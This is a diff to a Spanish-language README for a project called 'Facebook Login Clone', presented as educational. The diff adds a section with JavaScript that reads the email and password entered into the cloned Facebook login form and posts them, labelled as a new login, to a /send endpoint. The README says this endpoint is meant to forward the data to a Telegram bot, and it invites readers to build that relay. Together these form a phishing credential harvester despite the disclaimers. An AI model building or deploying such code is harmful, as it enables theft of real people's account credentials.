@@ -1,4 +1,4 @@
-# 📘 Facebook Clone - Proyecto Educativo
+# 📘 Facebook Login Clone - Proyecto Educativo
 
 > ⚠️ **Este proyecto es únicamente con fines educativos y de práctica. No está afiliado ni pretende suplantar a Facebook en ningún aspecto.**
 
@@ -46,7 +46,7 @@ facebook-clone/
 
 1. Clona este repositorio:
    ```bash
-   git clone https://github.com/tu-usuario/facebook-clone.git
+   git clone https://github.com/santipj/Facebook-Login-Clone.git
    ```
 2. Abre el archivo `index.html` con tu navegador.
 3. Explora, modifica y experimenta.
@@ -76,3 +76,45 @@ Desarrollado por [Santipj](https://github.com/santipj) como parte de su aprendiz
 ## 📝 Licencia
 
 Este proyecto se distribuye bajo la Licencia MIT.
+
+
+---
+
+## 🤖 Integración con Bot de Telegram (Simulación de Envío de Datos)
+
+Este proyecto incluye una función JavaScript que **simula** el envío de las credenciales ingresadas en el formulario a un bot de Telegram. Esta funcionalidad permite practicar cómo enviar datos desde el frontend hacia un backend (en este caso simulado como `/send`).
+
+### 📦 Código relevante (`index.html`)
+
+```html
+<script>
+  function sendToTelegram(event) {
+    event.preventDefault(); // Evita que recargue la página
+
+    const email = document.getElementById("Email").value;
+    const pass = document.getElementById("Password").value;
+
+    fetch("/send", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        message: `📥 Nuevo login:\n👤 Email: ${email}\n🔐 Password: ${pass}`
+      })
+    })
+    .then(res => res.text())
+    .then(data => {
+      console.log("Respuesta del servidor:", data);
+    })
+    .catch(err => {
+      console.error("Error al enviar:", err);
+    });
+  }
+</script>
+```
+
+⚠️ **Advertencia:** Esta función no enviará nada a Telegram si no existe un backend implementado para recibir las solicitudes POST en la ruta `/send`. Se recomienda **NO usar esta funcionalidad en entornos reales sin control** y únicamente con fines de aprendizaje.
+
+Puedes implementar fácilmente el receptor en Node.js, Python Flask, o cualquier otro backend que reenvíe los datos a la API oficial de Telegram Bots.
+
